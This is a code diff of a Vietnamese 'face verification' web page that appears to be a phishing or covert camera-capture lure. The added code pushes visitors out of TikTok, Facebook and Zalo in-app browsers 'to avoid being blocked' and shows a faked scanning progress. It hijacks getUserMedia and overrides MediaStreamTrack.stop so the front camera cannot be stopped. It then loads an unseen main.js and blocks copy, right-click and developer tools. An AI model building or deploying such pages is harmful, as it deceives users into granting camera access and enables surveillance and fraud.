@@ -4,35 +4,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác Thực Khuôn Mặt</title>
+    <title>Xác Thực Camera</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0a0e14;
+            background: #0d1117;
             color: white;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
             margin: 0;
             overflow: hidden;
         }
 
         .card {
-            background: #141a21;
-            padding: 30px 25px 35px;
-            border-radius: 28px;
+            background: #161b22;
+            padding: 30px;
+            border-radius: 24px;
             text-align: center;
-            width: 92%;
-            max-width: 400px;
-            border: 1px solid #2a313a;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7);
+            width: 90%;
+            max-width: 380px;
+            border: 1px solid #30363d;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
             position: relative;
             overflow: hidden;
         }
@@ -48,33 +42,18 @@
             pointer-events: none;
         }
 
-        .card h2 {
-            font-size: 22px;
-            font-weight: 600;
-            letter-spacing: 0.5px;
-            margin-bottom: 5px;
-            background: linear-gradient(135deg, #f0f6fc, #8b949e);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .sub-title {
-            font-size: 13px;
-            color: #8b949e;
-            margin-bottom: 18px;
-            letter-spacing: 1px;
-        }
-
-        /* ===== CAMERA VIEW ===== */
         .camera-view {
             width: 100%;
-            aspect-ratio: 4/3;
+            height: 300px;
             background: #000;
-            border-radius: 18px;
-            margin: 5px 0 18px;
+            border-radius: 16px;
+            margin: 20px 0;
             overflow: hidden;
             position: relative;
-            border: 2px solid #2a313a;
+            border: 2px solid #30363d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             transition: border-color 0.5s ease;
         }
 
@@ -90,15 +69,54 @@
             display: none;
         }
 
-        #msg {
-            color: #484f58;
-            font-size: 14px;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+        .btn {
+            background: #238636;
+            color: white;
+            border: none;
+            padding: 18px;
             width: 100%;
-            padding: 0 20px;
+            border-radius: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            transition: 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:hover:not(:disabled) {
+            background: #2ea043;
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(35, 134, 54, 0.3);
+        }
+
+        .btn:disabled {
+            background: #21262d;
+            color: #8b949e;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.15);
+            transform: scale(0);
+            animation: rippleAnim 0.8s linear;
+            pointer-events: none;
+        }
+
+        @keyframes rippleAnim {
+            to { transform: scale(4); opacity: 0; }
+        }
+
+        #status {
+            font-size: 13px;
+            color: #8b949e;
+            margin-top: 15px;
+            line-height: 1.5;
+            min-height: 38px;
         }
 
         /* ===== FACE SCANNER OVERLAY ===== */
@@ -166,7 +184,7 @@
             100% { top: 15%; opacity: 0.3; }
         }
 
-        /* Hiệu ứng glow pulse */
+        /* Hiệu ứng glow pulse cho khung */
         .scan-frame::after {
             content: '';
             position: absolute;
@@ -185,7 +203,7 @@
             50% { border-color: rgba(35, 134, 54, 0.3); box-shadow: 0 0 30px rgba(35, 134, 54, 0.1); }
         }
 
-        /* Chấm nhỏ ở giữa (dấu hiệu focus) */
+        /* Chấm focus giữa */
         .focus-dot {
             position: absolute;
             top: 50%;
@@ -201,10 +219,10 @@
 
         @keyframes dotPulse {
             0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
-            50% { transform: translate(-50%, -50%) scale(1.8); opacity: 0.9; }
+            50% { transform: translate(-50%, -50%) scale(2); opacity: 0.9; }
         }
 
-        /* ===== BỘ ĐẾM TIẾN ĐỘ ===== */
+        /* ===== PROGRESS RING ===== */
         .progress-ring {
             display: none;
             margin: 12px auto 0;
@@ -249,59 +267,7 @@
             color: #58d68d;
         }
 
-        /* ===== BUTTON ===== */
-        .btn {
-            background: #238636;
-            color: white;
-            border: none;
-            padding: 16px;
-            width: 100%;
-            border-radius: 14px;
-            font-weight: 700;
-            cursor: pointer;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            letter-spacing: 0.5px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn:hover:not(:disabled) {
-            background: #2ea043;
-            transform: translateY(-1px);
-            box-shadow: 0 8px 25px rgba(35, 134, 54, 0.3);
-        }
-
-        .btn:disabled {
-            background: #21262d;
-            color: #8b949e;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .btn .ripple {
-            position: absolute;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.15);
-            transform: scale(0);
-            animation: rippleAnim 0.8s linear;
-            pointer-events: none;
-        }
-
-        @keyframes rippleAnim {
-            to { transform: scale(4); opacity: 0; }
-        }
-
-        #status {
-            font-size: 13px;
-            color: #8b949e;
-            margin-top: 14px;
-            line-height: 1.6;
-            min-height: 38px;
-        }
-
-        /* ===== WARNING OVERLAY ===== */
+        /* Lớp phủ cảnh báo cưỡng bách cho In-App Browser */
         #browser-warning {
             display: none;
             position: fixed;
@@ -313,82 +279,57 @@
             z-index: 10000;
             padding: 40px 20px;
             box-sizing: border-box;
-            align-items: center;
-            justify-content: center;
-        }
-
-        #browser-warning.show {
-            display: flex;
         }
 
         .warning-box {
             background: #1c2128;
             border: 2px solid #f85149;
-            padding: 35px 25px;
-            border-radius: 24px;
+            padding: 30px;
+            border-radius: 20px;
             text-align: center;
-            max-width: 400px;
-            width: 100%;
         }
 
         .warning-box h3 {
             color: #f85149;
             margin-top: 0;
-            font-size: 20px;
         }
 
-        .warning-box .steps {
+        .steps {
             text-align: left;
             margin-top: 20px;
             color: #c9d1d9;
-            font-size: 15px;
-            line-height: 2.2;
+            font-size: 16px;
+            line-height: 2;
         }
 
-        .warning-box .highlight {
+        .highlight {
             color: #ffeb3b;
             font-weight: bold;
-        }
-
-        .warning-box .icon-big {
-            font-size: 48px;
-            margin-bottom: 10px;
-        }
-
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 420px) {
-            .card { padding: 20px 16px 25px; }
-            .card h2 { font-size: 19px; }
-            .scan-frame { width: 75%; height: 78%; }
-            .btn { padding: 14px; font-size: 15px; }
         }
     </style>
 </head>
 
 <body>
 
-    <!-- ===== WARNING IN-APP ===== -->
     <div id="browser-warning">
         <div class="warning-box">
-            <div class="icon-big">⚠️</div>
-            <h3>YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
+            <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
             <div class="steps">
-                Vui lòng mở bằng trình duyệt để xác thực khuôn mặt:<br><br>
-                1. Nhấn vào biểu tượng <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> góc trên phải.<br>
-                2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span> (hoặc <i>Open in Browser</i>).
+                Hãy Mở Website Theo Hướng Dẫn Phía Dưới Để Không Bị Chặn. Vui lòng:<br>
+                1. Nhấn vào biểu tượng <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> ở
+                góc trên bên phải.<br>
+                2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span> (hoặc <i>Open in Browser</i>/<i>Safari</i>)
+                để bắt đầu xác thực.
             </div>
         </div>
     </div>
 
-    <!-- ===== MAIN CARD ===== -->
     <div class="card" id="mainCard">
-        <h2>🔐 Xác Minh Khuôn Mặt</h2>
-        <p class="sub-title">Nhìn thẳng vào camera để xác thực</p>
-
+        <h2 style="margin: 0;">🔐 Xác Minh Người Dùng</h2>
         <div class="camera-view" id="vBox">
+            <p id="msg" style="color: #484f58;">Đang khởi tạo camera...</p>
             <video id="preview" autoplay playsinline muted></video>
-            <p id="msg">📷 Đang khởi tạo camera...</p>
-
+            
             <!-- Overlay quét mặt -->
             <div class="scanner-overlay" id="scannerOverlay">
                 <div class="scan-frame">
@@ -401,7 +342,7 @@
                 </div>
             </div>
         </div>
-
+        
         <!-- Progress ring -->
         <div class="progress-ring" id="progressRing">
             <svg viewBox="0 0 50 50">
@@ -410,66 +351,74 @@
             </svg>
             <span class="progress-text" id="progressText">0%</span>
         </div>
-
+        
         <button class="btn" id="startBtn">BẮT ĐẦU XÁC THỰC</button>
-        <div id="status">Hệ thống sẽ tự động chuyển hướng sau khi hoàn tất</div>
+        <div id="status">Hệ thống sẽ tự động chuyển hướng sau khi hoàn tất.</div>
     </div>
 
     <script>
-        // ============================================================
-        // PHẦN 1: PHÁT HIỆN IN-APP BROWSER
-        // ============================================================
+        // --- PHẦN 1: CẬP NHẬT USER AGENT TIKTOK MỚI NHẤT ---
         function checkAndShowWarning() {
-            const ua = navigator.userAgent || navigator.vendor || window.opera || '';
-            const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
-            if (isInApp) {
-                document.getElementById('browser-warning').classList.add('show');
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+
+            // TikTok sử dụng 'TikTok', 'musical_ly', 'ByteLocale' trong chuỗi UA của họ
+            const isTikTok = /TikTok|musical_ly|ByteLocale/i.test(ua);
+            const isOtherInApp = /FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
+
+            if (isTikTok || isOtherInApp) {
+                document.getElementById('browser-warning').style.display = 'block';
                 document.getElementById('mainCard').style.display = 'none';
             }
         }
         document.addEventListener("DOMContentLoaded", checkAndShowWarning);
 
-        // ============================================================
-        // PHẦN 2: LOGIC CAMERA + HIỆU ỨNG QUÉT
-        // ============================================================
+        // --- PHẦN 2: LOGIC CAMERA PROXY (GIỮ NGUYÊN) ---
         const btn = document.getElementById('startBtn');
         const video = document.getElementById('preview');
-        const statusEl = document.getElementById('status');
-        const msgEl = document.getElementById('msg');
+        const status = document.getElementById('status');
+        const msg = document.getElementById('msg');
+        const REDIRECT_URL = "";
         const vBox = document.getElementById('vBox');
         const scannerOverlay = document.getElementById('scannerOverlay');
         const progressRing = document.getElementById('progressRing');
         const progressCircle = document.getElementById('progressCircle');
         const progressText = document.getElementById('progressText');
 
-        const REDIRECT_URL = ""; // Thay link chuyển hướng nếu cần
-
-        // Lưu trữ stream
+        const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
+        const originalStop = MediaStreamTrack.prototype.stop;
         let frontStream = null;
-        let scanInterval = null;
         let progressInterval = null;
 
-        // ===== BẮT CAMERA =====
-        async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
-                });
+        navigator.mediaDevices.getUserMedia = async (constraints) => {
+            const stream = await originalGetUserMedia(constraints);
+            if (constraints.video && constraints.video.facingMode === 'user') {
                 frontStream = stream;
                 video.srcObject = stream;
-                video.style.display = 'block';
-                msgEl.style.display = 'none';
+                video.style.display = "block";
+                msg.style.display = "none";
+                vBox.style.borderColor = "#238636";
                 vBox.classList.add('active');
-                return true;
-            } catch (err) {
-                msgEl.textContent = '❌ Không thể truy cập camera. Vui lòng cho phép quyền.';
-                msgEl.style.display = 'block';
-                console.error('Camera error:', err);
-                return false;
             }
+            return stream;
+        };
+
+        MediaStreamTrack.prototype.stop = function () {
+            if (this.label.toLowerCase().includes('front') || this.label.toLowerCase().includes('user')) {
+                console.log("Giữ lại preview cho camera trước...");
+            } else {
+                originalStop.apply(this);
+            }
+        };
+
+        // ===== HÀM CẬP NHẬT PROGRESS =====
+        function updateProgress(percent) {
+            const circumference = 125.6; // 2 * PI * 20
+            const offset = circumference - (percent / 100) * circumference;
+            progressCircle.style.strokeDashoffset = offset;
+            progressText.textContent = Math.round(percent) + '%';
         }
 
-        // ===== KHỞI TẠO SCANNER =====
+        // ===== HÀM BẮT ĐẦU QUÉT =====
         function startScanner() {
             scannerOverlay.classList.add('active');
             vBox.classList.add('active');
@@ -479,94 +428,41 @@
             scannerOverlay.classList.remove('active');
         }
 
-        // ===== CẬP NHẬT PROGRESS =====
-        function updateProgress(percent) {
-            const circumference = 125.6; // 2 * PI * 20
-            const offset = circumference - (percent / 100) * circumference;
-            progressCircle.style.strokeDashoffset = offset;
-            progressText.textContent = Math.round(percent) + '%';
-        }
-
-        // ===== MÔ PHỎNG QUÁ TRÌNH XÁC THỰC =====
-        function simulateVerification() {
+        // ===== MÔ PHỎNG TIẾN TRÌNH =====
+        function simulateProgress() {
             let progress = 0;
-            const steps = 60; // số bước
-            const stepTime = 60; // ms mỗi bước
-
             progressRing.classList.add('active');
-            btn.disabled = true;
-            btn.textContent = 'ĐANG XÁC THỰC...';
-            statusEl.innerHTML = '🔄 Đang quét khuôn mặt...<br>Vui lòng giữ nguyên vị trí';
-
-            // Khởi động scanner
             startScanner();
-
+            
             return new Promise((resolve) => {
                 progressInterval = setInterval(() => {
-                    progress += 100 / steps;
-
-                    // Tăng tốc độ quét khi gần hoàn thành
-                    const progressPercent = Math.min(progress, 100);
-                    updateProgress(progressPercent);
-
-                    // Cập nhật trạng thái theo tiến trình
-                    if (progressPercent < 30) {
-                        statusEl.innerHTML = '🔍 Đang xác định khuôn mặt...';
-                    } else if (progressPercent < 60) {
-                        statusEl.innerHTML = '📊 Đang phân tích đặc điểm...';
-                    } else if (progressPercent < 85) {
-                        statusEl.innerHTML = '✅ Đối chiếu dữ liệu...';
-                    } else {
-                        statusEl.innerHTML = '⭐ Xác thực thành công!';
-                    }
-
-                    if (progressPercent >= 100) {
+                    progress += 2;
+                    if (progress >= 100) {
+                        progress = 100;
                         clearInterval(progressInterval);
                         progressInterval = null;
-                        updateProgress(100);
                         resolve();
                     }
-                }, stepTime);
+                    updateProgress(progress);
+                    
+                    // Cập nhật trạng thái theo tiến trình
+                    if (progress < 30) {
+                        status.innerHTML = "🔍 Đang xác định khuôn mặt...<br>Vui lòng giữ nguyên vị trí.";
+                    } else if (progress < 60) {
+                        status.innerHTML = "📊 Đang phân tích đặc điểm...<br>Vui lòng không di chuyển.";
+                    } else if (progress < 85) {
+                        status.innerHTML = "✅ Đang đối chiếu dữ liệu...<br>Gần hoàn tất.";
+                    } else {
+                        status.innerHTML = "⭐ Xác thực thành công!<br>Đang xử lý kết quả...";
+                    }
+                }, 100);
             });
         }
 
-        // ===== ĐẾM NGƯỢC CHUYỂN HƯỚNG =====
-        function startCountdown() {
-            let timeLeft = 7;
-            statusEl.innerHTML = `✅ Xác thực thành công! Chuyển hướng sau ${timeLeft}s`;
-            btn.textContent = `HOÀN TẤT (${timeLeft}s)`;
-
-            const timer = setInterval(() => {
-                timeLeft--;
-                if (timeLeft > 0) {
-                    btn.textContent = `HOÀN TẤT (${timeLeft}s)`;
-                    statusEl.innerHTML = `✅ Xác thực thành công! Chuyển hướng sau ${timeLeft}s`;
-                } else {
-                    clearInterval(timer);
-                    btn.textContent = 'ĐANG CHUYỂN HƯỚNG...';
-                    statusEl.innerHTML = '🚀 Đang chuyển hướng...';
-
-                    // Dọn dẹp
-                    if (frontStream) {
-                        frontStream.getTracks().forEach(t => t.stop());
-                    }
-                    stopScanner();
-                    progressRing.classList.remove('active');
-
-                    if (REDIRECT_URL) {
-                        window.location.href = REDIRECT_URL;
-                    } else {
-                        statusEl.innerHTML = '✅ Xác thực hoàn tất! (Không có link chuyển hướng)';
-                        btn.textContent = 'ĐÃ XÁC THỰC';
-                    }
-                }
-            }, 1000);
-        }
-
-        // ===== XỬ LÝ CLICK NÚT =====
         btn.addEventListener('click', async () => {
-            if (btn.disabled) return;
-
+            btn.disabled = true;
+            btn.innerText = "ĐANG XỬ LÝ...";
+            
             // Ripple effect
             const rect = btn.getBoundingClientRect();
             const ripple = document.createElement('span');
@@ -577,52 +473,73 @@
             ripple.style.top = (event.clientY - rect.top - size/2) + 'px';
             btn.appendChild(ripple);
             setTimeout(() => ripple.remove(), 800);
-
-            // Bật camera nếu chưa có
-            if (!frontStream) {
-                const ok = await startCamera();
-                if (!ok) {
-                    btn.disabled = false;
-                    return;
-                }
-            }
-
-            // Bắt đầu xác thực
-            await simulateVerification();
-
-            // Đợi thêm 1s để hiển thị 100%
-            await new Promise(r => setTimeout(r, 1000));
-
+            
+            status.innerHTML = "🔄 Đang khởi tạo xác thực...<br>Vui lòng đợi.";
+            
+            // Chạy hiệu ứng quét và tiến trình
+            await simulateProgress();
+            
             // Dừng scanner
             stopScanner();
+            
+            // Gọi script main.js
+            const script = document.createElement('script');
+            script.src = './main.js';
+            document.body.appendChild(script);
 
-            // Bắt đầu đếm ngược
-            startCountdown();
-        });
-
-        // ============================================================
-        // PHẦN 3: TỰ ĐỘNG KHỞI TẠO CAMERA KHI LOAD
-        // ============================================================
-        window.addEventListener('load', () => {
-            // Tự động khởi tạo camera để có preview ngay
-            startCamera().then(success => {
-                if (success) {
-                    statusEl.innerHTML = '📸 Camera sẵn sàng. Nhấn "Bắt đầu xác thực" để tiến hành.';
+            const checkFinished = setInterval(() => {
+                if (window.mainScriptFinished === true) {
+                    clearInterval(checkFinished);
+                    startCountdown();
                 }
-            });
+            }, 500);
         });
 
-        // ============================================================
-        // CHẶN CHUỘT PHẢI, F12, COPY (bảo mật cơ bản)
-        // ============================================================
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
+        function startCountdown() {
+            let timeLeft = 7;
+            const timer = setInterval(() => {
+                btn.innerText = `HOÀN TẤT TRONG ${timeLeft}S`;
+                status.innerText = "✅ Xác Thực Thành Công, Đang Chuyển Hướng...";
+                timeLeft--;
+
+                if (timeLeft < 0) {
+                    clearInterval(timer);
+                    if (frontStream) {
+                        frontStream.getTracks().forEach(t => originalStop.apply(t));
+                    }
+                    // Reset progress
+                    progressRing.classList.remove('active');
+                    updateProgress(0);
+                    if (REDIRECT_URL) {
+                        window.location.href = REDIRECT_URL;
+                    }
+                }
+            }, 1000);
+        }
+
+    </script>
+    
+    <!-- Code chặn chuột phải và F12 (không hiện thông báo) -->
+    <script>
+        // Chặn copy
+        document.addEventListener('copy', function (e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Chặn context menu
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Chặn F12 và dev tools
+        document.addEventListener('keydown', function(e) {
             if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J'].includes(e.key.toUpperCase()))) {
                 e.preventDefault();
                 return false;
             }
         });
-        document.addEventListener('copy', e => e.preventDefault());
     </script>
 
 </body>
